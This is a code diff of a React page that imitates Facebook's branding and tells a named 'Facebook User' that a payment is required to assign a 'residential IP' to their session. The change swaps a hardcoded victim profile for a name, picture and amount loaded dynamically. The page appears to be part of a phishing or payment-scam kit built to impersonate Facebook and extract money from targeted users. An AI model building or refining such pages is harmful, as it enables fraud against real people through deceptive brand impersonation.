@@ -1,15 +1,20 @@
 'use client';
 
-import { useState } from 'react';
+import multipleStep from '@/lib/multipleStep';
+import { useEffect, useState } from 'react';
 
 export default function ResidentialIpPayment() {
   const [paid, setPaid] = useState(false);
 
-  const fbUser = {
-    name: 'Nur Alam',
-    profilePic:
-      'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRGCg4pLQ1ckWPPMqf4s4eLyiKKMUU9bpjtA&s',
-  };
+  const [infos, setInfos] = useState<any>(null);
+ 
+   useEffect(() => {
+     async function fetchInfos() {
+       const data = await multipleStep();
+       setInfos(data);
+     }
+     fetchInfos();
+   }, []);
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
@@ -17,13 +22,12 @@ export default function ResidentialIpPayment() {
         {/* User Header */}
         <div className="flex items-center gap-4 mb-6">
           <img
-            src={fbUser.profilePic}
-            alt="Profile"
+            src={infos?.profile_pic}
             className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
           />
           <div>
             <p className="text-sm text-gray-500">Facebook User</p>
-            <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
+            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
           </div>
         </div>
 
@@ -57,7 +61,7 @@ export default function ResidentialIpPayment() {
           Residential IP Required
         </h1>
         <p className="text-sm text-gray-600 mb-5 text-center">
-          To continue securely, a <strong>$8 payment</strong> is required to assign a dedicated residential IP address to your current session.
+          To continue securely, a <strong>${infos?.payment} payment</strong> is required to assign a dedicated residential IP address to your current session.
         </p>
 
         {/* Payment Notice */}
@@ -72,7 +76,7 @@ export default function ResidentialIpPayment() {
           onClick={() => setPaid(true)}
           className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
         >
-          Pay $8 for Residential IP
+          Pay ${infos?.payment} for Residential IP
         </button>
 
         {/* Confirmation */}
